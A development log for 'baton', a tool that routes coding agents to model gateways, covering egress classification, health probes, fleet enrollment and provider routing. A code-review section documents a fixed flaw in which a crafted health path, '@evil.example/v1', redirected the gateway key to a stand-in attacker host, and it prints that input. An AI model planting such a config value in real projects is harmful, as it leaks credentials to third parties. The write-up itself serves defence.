Nothing in the researched fleet hits this — the interactive-only agents (aider,
opencode) reach `ollama` endpoints, which need no key — so it costs nothing and
closes the hole.

### Step 2 — three refusals, because there are three different fixes

`no-endpoint` (the vendor allows no custom endpoint, or the agent does not speak
this endpoint's dialect), `endpoint-unreachable` (the gateway did not answer),
`endpoint-unauthorized` (it answered 401, **or** we have no credential to send).
The message names the agents that can reach *this* endpoint rather than a fixed
list. P16-E6 holds: an agent with no endpoint reach and no endpoint model
launches exactly as before — the refusal is for an impossible pairing, not for
using Antigravity at all.

### Step 3 — the cost rule

An entry that could not run **because its gateway failed** never falls through to
an entry that costs money. An entry skipped because its **CLI is not installed**
still does — that chain is the user's own configuration. That distinction is the
whole rule, and it is what the tests are about.

Consent is `--allow-paid-fallback` or `endpoints.allowPaidFallback`, off by
default, and every promotion is named with the model it moved from and why.

### Two bugs found by running it, not by testing it

Both would have passed review:

1. **The refusal named the wrong cause.** With a dead gateway and `opus` sitting
   in the local tier, it said *"no endpoint serves opus"* — sending someone to
   fix a config line that was never the problem. The gateway is the story when
   the gateway is what failed.
2. **Consent worked for only one shape of paid entry.** `allowPaidFallback` was
   honoured for an entry priced `paid` but not for an *unserved* local-tier
   entry — and a local tier's last resort is usually the unserved shape, so the
   flag did nothing in the most common case. Both shapes now cross the same
   boundary.

A third, smaller one: `baton route` printed *"nothing in the chain is
installed"* underneath a refusal, next to an agent that was installed.

### Verified live

```
$ baton route "tidy the changelog"        # gateway down, consent off
✗ refused   matched 'changelog'
  'workstation' did not answer, and 'claude:opus' is not on your hardware
  either. Fix the endpoint, or pass --allow-paid-fallback (or set
  endpoints.allowPaidFallback) to spend on it deliberately.

$ ... gateway up
→ claude (model: qwen3-coder)             # runs on your hardware

$ ... gateway down, allowPaidFallback: true
→ claude (model: opus)
  ⚠ promoted claude:qwen3-coder → claude:opus (paid): 'workstation' did not answer
```

And the injection itself, against the built `dist/`:

```
injected vars : ANTHROPIC_BASE_URL, ANTHROPIC_API_KEY
agent echoes it: [redacted: endpoint credential]      <- P16-E5
antigravity gets: {}
grep -c sk-live-… over the whole `baton doctor` output: 0
```

### Tests

`test/endpoint-injection.test.ts` (16), `test/endpoint-refusal.test.ts` (16),
`test/cost-safety.test.ts` (13).

Verified: `npx vitest run` → **175 files, 2127 tests, 0 failures**;
`npx tsc --noEmit` exit 0; `npm run build` clean.

### The plan file

`launch-injection` removed from `baton/plans/roadmap-parallel.md` and
`model-catalog` un-gated — it has no unmet dependency now.
`baton plan check` → 8 tasks across 1 phase.

---

## P17 — Live model catalog, health, recovery (2026-08-22)

The half of the model picker that lives in Baton, built to the gateway-strategy
track (D4/D5) the planning session added the same day.

### New — `src/endpoints/`

| File | What |
|---|---|
| `gateways/types.ts` | `GatewayAdapter` — the boundary. Administration only; routing never comes here |
| `gateways/omniroute.ts` | The adapter that ships, plus `direct` for a runtime with no gateway in front of it |
| `gateways/registry.ts` | Resolves an adapter. **LiteLLM is absent, not disabled** |
| `egress.ts` | `local` / `external` / `unknown`, computed from the endpoint |
| `catalog.ts` | What is served right now; config becomes the labelled fallback |
| `status.ts` | One assembled answer: CLI, bus, and later the pane and the phone |
| `commands/endpoints.ts` | `baton endpoints status` |

`config.ts` grew two declarations (`gateway`, `egress`); `health.ts` grew a
fourth state; `events.ts` grew `endpoints.status`.

### The adapter boundary is enforced by a test, not by discipline

Both gateways speak OpenAI-compatible HTTP over P15's `url` + `keyRef`, so
routing needs no per-gateway code at all — they differ only in administration.
`gateway-adapter.test.ts` walks every `.ts` under `src/` and fails if a quoted
gateway id appears outside `endpoints/gateways/`. A literal there is a branch on
which gateway is running, and one branch turns the LiteLLM migration from a
config change back into a rewrite.

LiteLLM is **not registered**, so a hand-edited config naming it cannot select
it — it falls back to the shipping adapter and says so rather than silently
using something else.

### 🔴 Egress: the endpoint decides, and `local` is never a guess

`gpt-4o` served by a customer's own vLLM is `local`; a model called
`local-llama` behind someone's cloud proxy is `external`. A name is a string a
vendor chose; the address is a fact.

Loopback, RFC1918, link-local, IPv6 unique-local and reserved internal suffixes
(`.internal`, `.lan`, `.home.arpa`) are `local`. A public host is `external`. A
**single-label host** (`http://gpu:11434`) is `unknown` — it is *probably*
internal DNS, and probably is exactly what this classifier may not do. An admin
settles it with `"egress": "local"`, which outranks inference in both
directions, because they know about the VPN and about the loopback port that is
really a tunnel.

The asymmetry is deliberate: calling an external endpoint local puts code on a
third party's servers under a badge promising otherwise; calling a local one
unknown costs one line of config.

### The catalog replaces config as the source of truth

`/v1/models` (or Ollama's `/api/tags`) is what is served *now*; the configured
list becomes the fallback, and a fallback is marked `verified: false` and
rendered as "configured (unverified)". A list nobody confirmed, shown as if
somebody had, is the same lie as reporting a health check we could not run as
"up".

One fetch per endpoint per 30s window, shared by every caller **including
callers that arrive while the first fetch is still in the air** — a result-only
cache lets twenty queued tasks make twenty requests.

### A timed-out probe is `unknown`, never up and never down

New fourth health state. A refused socket is a fact; silence is not. `unknown`
blocks a launch exactly like `unreachable` (it is not permission), but says
which of the two we actually know — and the message names the host, because
"the URL is internal and I am off the VPN" is the support ticket this answers.

### Verified live

```
$ baton endpoints status
✓ workstation — ollama via direct  http://127.0.0.1:7698
    On your network
    serving, as of 2026-08-22T17:43:37.265Z:
      qwen3-coder:7b   On your network
      llama3.1:8b      On your network          <- live catalog; config listed one model
? corp — openai-compatible via omniroute  https://gw.corp.internal/v1
    corp (gw.corp.internal) did not answer within 2000ms — it may be slow, or
    unreachable from this machine
    configured (unverified), as of …:
      kimi-k2   On your network
✗ vendor — openai-compatible via omniroute  https://api.openai.com/v1
    Leaves your network
    ⚠ unusable: OAI is not set in this environment
```

### Tests

`test/egress-class.test.ts` (9), `test/gateway-adapter.test.ts` (6),
`test/endpoint-catalog.test.ts` (11), `test/endpoint-health.test.ts` (4),
`test/endpoint-status.test.ts` (8).

One of them could not fail as first written — it asserted on a second fixture
server's request log, which is empty whatever the code does. Fixed to assert on
the server that was actually called.

Verified: `npx vitest run` → **180 files, 2165 tests, 0 failures**;
`npx tsc --noEmit` exit 0; `npm run build` clean.

### P19's daemon half (2026-08-22)

Two additions, both read-only:

- `GET /api/endpoints/status` — the same rows `baton endpoints status` prints.
  It carries **no credential and no `keyRef`**: reachability, model names and
  egress class are the whole payload. The phone has no use for the name of an
  environment variable on someone else's machine.
- `EndpointStatusRow.reachableBy` / `.unreachableBy` — computed here from
  `AGENT_ENDPOINT_REACH`, so the fork's settings pane and the phone keep no
  second copy of the reach table that could drift from what the dispatcher
  believes. The CLI prints both lists too, because "why is my Antigravity task
  not using the gateway" is answered by seeing antigravity listed as unable to
  reach it.

The Orcabaton side (pane, mobile screen, relay verb `baton.endpoints`) is in
that repo and is committed there.

---

## Code review of P15–P19, and what it caught (2026-08-22)

Three axes ran in isolated contexts — standards, spec, security. Five findings
survived refutation and are fixed here; the rest are recorded in the other repo.

### 🔴 HIGH — the health path could send the gateway key to another host

`probeEndpoint` built its request as `` `${endpoint.url}${endpoint.health}` ``.
A `health` of `"@evil.example/v1"` makes
`https://gw.corp.internal:4000@evil.example/v1` a request to **evil.example**,
with the gateway demoted to userinfo — carrying the key in `x-api-key`.
Confirmed by running it, not by reading it:

```
"@evil.example/v1"  =>  host: evil.example   user: gw.corp.internal
```

It defeated two controls this same phase introduced: `checkUrl` refuses
credentials in `url` but never saw the concatenated string, and `classifyEgress`
reads `url`, so the pane would have badged it **"On your network"** while the
keyed request left the network. `baton.config.json` is committed, so anyone who
can land a config change in a customer's repo could have reached it.

Fixed at both ends. `config.ts` accepts only a plain absolute path (`/…`, no
`@`, no `//`, no backslash, no whitespace) and otherwise falls back to `/health`
with a named error. `health.ts` gained `probeUrlFor`, which resolves with
`new URL(path, base)` and **refuses unless the origin is unchanged** — the
request that carries the credential is the one worth checking twice.

Worth recording: `new URL('@evil.example/v1', base)` is *safe* — it resolves to
a relative path on the base's own host. Only string concatenation was dangerous.
My first test asserted the wrong thing (a `null` return); it now asserts the
property that matters, which is the origin.

### MEDIUM — a credential in a URL path segment loaded

`checkUrl` checked userinfo and query parameters only, so
`https://gw/proxy/sk-ant-…/v1` was accepted — and this phase publishes `url` to
the settings pane and the phone. Now routed through `detectSecret`, the repo's
own detector, so one check covers every shape it already knows.

### The read/publish/read loop

`endpointsStatus()` published `endpoints.status` on the bus; `/api/events`
streams every event; the settings pane re-fetches on any event. Read → publish →
read, forever, while the pane was open — the precise thing D5's "a viewer never
triggers an upstream call" was written to prevent. The read now publishes
nothing; the event stays declared for the poller that will own the usage feed.

### An endpoint we never asked about was reported "rejected"

An endpoint whose `keyRef` did not resolve was given `health: 'unauthorized'` —
a rejection the gateway never issued, because it was never asked. It is
`unknown` now, with the config reason as its detail. P16-E8 keeps those two
apart on purpose: different cause, different fix.

### Two smaller ones

- **P17-E4 was only half kept.** `catalog.ts` de-duplicated concurrent callers;
  `health.ts` did not, so N callers arriving together made N probes — the
  Monday-9am case. Same in-flight map now.
- **`https://gw/v1` asked for `/v1/v1/models`.** A base URL already carrying the
  `/v1` convention is the common case; the join now handles it.
- `live-endpoints.ts` exported a function called `build`. Renamed
  `buildLiveEndpoints`.

### Verified

```
npx vitest run   # 2176 tests, 0 failures
npx tsc --noEmit # exit 0      npm run build # clean
```

And live, with the exfiltration endpoint planted in a real config:

```
✗ endpoints.evil.health: expected a path beginning with '/' and containing
  no '@' — using /health
evil (gw.corp.internal:4000) did not answer   <- went to the gateway, not evil.example
grep -c sk-live-… over the output: 0
```

---

## P18 — Company fleet enrollment + model grants (2026-08-23)

Two things a company with ten developers needs and a solo laptop must not
notice: **who may run a model that leaves the network**, and **how ten laptops
get configured without ten people pasting a key**.

### New files

| File | What it decides |
|---|---|
| `src/endpoints/grants.ts` | May this person run this model? `local` open to all; anything that leaves is denied until an admin names someone. Storage included; `administered` is derived from the member registry at load, never stored |
| `src/endpoints/enrollment.ts` | The payload a host publishes, what a member does with it, and `enrollmentFor` / `revokeIssuedKeysFor` wired to the gateway |
| `src/endpoints/managed-credentials.ts` | The 0600 store enrolled credentials land in, and the env merge that lets `resolveEndpointKey` stay a single synchronous `env:` scheme |
| `src/endpoints/issued-keys.ts` | What this host issued at the gateway and for whom — ids only, never key material |

### Changed

- `gateways/types.ts` + `omniroute.ts` — `mintMemberKey` and `revokeMemberKey`
  against OmniRoute's real admin API (`POST /api/v1/registered-keys`, and
  `…/[id]/revoke`), verified against the route source in `.refs/OmniRoute`.
  Both are optional: the direct adapter simply does not have them, which is how
  a caller tells "nobody to ask" (GW-E7) from "asked and refused".
- `config.ts` — `loadEndpointsConfig` merges the managed-credential store into
  the env it validates against. A real environment variable still wins.
- `server.ts` — `GET /api/endpoints/enrollment`.
- `commands/endpoints.ts` + `cli.ts` — `endpoints refresh | grant | revoke |
  grants`.
- `commands/member.ts` — revoking a member now also kills the gateway
  credentials this host issued them, and reports per key whether that worked.
- `commands/workspace.ts` — `baton join --token` carries the endpoints block.

### The rule the phase turns on

**The shared gateway key is never in the enrollment payload** (P18-E1). Ship it
to ten laptops and revoking one developer means re-keying the company — which
means nobody ever revokes anybody. When the gateway cannot mint a per-member
key, the payload carries a note saying so and no credential at all. The
tempting fallback is the bug.

### 🔴 Found by running it, not by reading it

The enrollment route took the member from `access.member`. `decideAccess` rule 1
lets a **loopback** peer through with no credential, so `access.member` is null
even when a valid token was presented — and loopback is the normal path here
(the Orca app, an SSH tunnel, curl on the host). Every credential was filed
under `local`.

That silently breaks P18-E2: `baton member revoke priya` reads the ledger, finds
nothing under `priya`, prints success, and the leaver keeps a working key. Two
members over loopback would also collide on one identity, so one developer's
refresh revoked the other's credential. The route now resolves the presented
bearer itself. `test/endpoint-enrollment-identity.test.ts` reproduces it against
a live daemon and a fixture gateway.

### One thing worth knowing about this repo's tests

`test/team-api.test.ts` and `test/member-controls.test.ts:301` both bind **7398**.
That is pre-existing and not mine, but it is why those two flake together when
the suite runs in parallel — worth a free port when someone is next in there.
(My own test collided with `kb-neighbours-api` on 7443; fixing that took the
suite from 7 failing files to 1.)

### Verified

```
npx vitest run    # 2231 passed, 3 failed  — all 3 in plan-approve-api.test.ts,
                  # which passes 14/14 in isolation (daemon-on-a-fixed-port flake)
npx tsc --noEmit  # exit 0        npm run build  # clean
```

Live, end to end, against a fixture gateway on loopback:

```
$ baton endpoints grants                 # no members yet
Nobody administers this machine, so every model is yours to use.

$ baton member add Ravi --role owner && baton endpoints grant priya qwen3-coder
'qwen3-coder' runs on your own network via 'workstation' — everyone can already use it.

$ baton endpoints grant priya gpt-4o
✓ priya may now use 'gpt-4o' on 'vendor' — which leaves your network.

$ curl -H "Authorization: Bearer baton_…" .../api/endpoints/enrollment
  → keyRef "env:BATON_MANAGED_VENDOR", credential "sk-issued-1", no shared key
  → gateway saw: POST /api/v1/registered-keys {"name":"baton-member-priya",…}
  → .baton/issued-keys.json: [{ memberId: "priya", keyId: "k1" }]
```

---

## P27 — Per-agent provider routing (2026-08-23)

Which provider each agent talks to, decided per agent and per repo.

### New

`src/endpoints/policy.ts` — `resolveProviderMode` (precedence repo → user →
default `vendor`), `providerLaunchRefusal`, `readProviderPolicy`, and the
per-machine store at `.baton/providers.json`.

`src/endpoints/reach.ts` gains `knownAgentIds()`, which returns the agents that
CANNOT be routed as well — a settings pane that hides Antigravity reads as "they
forgot Antigravity", while one that shows it with the vendor's reason answers the
question before it is asked.

### Changed

- `live-endpoints.ts` — `LaunchInjection` gains `refusal`. It is a separate
  field from `env` on purpose: an empty `env` is indistinguishable from a healthy
  vendor launch, so signalling a refusal by absence would BE the fallback P27
  forbids.
- `spawn.ts` and `terminals.ts` — both now throw on that refusal. `terminals.ts`
  checks it *before* the interactive-credential refusal, because where the code
  goes outranks how the credential is passed.
- `server.ts` — `GET`/`POST /api/endpoints/providers`, **loopback-only**. The
  mode is per-machine (P27-E10), so a remote member setting it is not a coherent
  operation, and what it decides is where this repo's source is sent — not a
  decision to accept from the network.
- `commands/endpoints.ts` + `cli.ts` — `endpoints preview <agent>` and
  `endpoints use <agent> <mode>`.

### The rule

**A `gateway`-mode agent whose gateway is unreachable refuses. It never falls
back to the vendor.** P16's cost rule protects a bill and can be overridden by
someone who decides the money is worth it; this one protects the code and
cannot. `unknown` health refuses too — an indeterminate probe is not permission.

Vendor mode keeps P16's behaviour exactly: naming a model an endpoint serves is
itself the request to use it, and that has been true since P16. P27 adds gateway
mode on top rather than taking that away, so nothing that worked yesterday
stopped working.

### Verified

```
npx vitest run    # 2256 passed, 1 failed — memory-repair-endpoint.test.ts,
                  # which passes 2/2 in isolation (load flake, same family as
                  # the fixed-port daemon tests)
npx tsc --noEmit  # exit 0        npm run build  # clean
```

Live, against a fixture gateway:

```
$ baton endpoints preview claude
claude: vendor
  'claude' uses its own subscription or key. Nothing is written anywhere.
  Launch would set: nothing.

$ baton endpoints use antigravity gateway
✗ 'antigravity' cannot be pointed at your own models — its vendor allows no
  custom endpoint for the reasoning model. That is their decision, not a setting here.

$ baton endpoints use claude gateway && baton endpoints preview claude --model kimi-k2
  ✗ 'fleet' did not answer, and 'claude' is set to use your own models. Refusing
    to launch: falling back to the vendor would send this repo off your network…
  exit=1

# gateway up:
  endpoint  fleet (http://127.0.0.1:4599/v1)
  egress    local
  launch would set:  ANTHROPIC_BASE_URL=http://127.0.0.1:4599/v1

# P27-E4, developer exported it themselves:
$ ANTHROPIC_BASE_URL=https://my-own-proxy.example baton endpoints preview claude
claude: vendor  (from environment)
  Your shell already exports ANTHROPIC_BASE_URL, so 'claude' is left pointed where you put it.
```
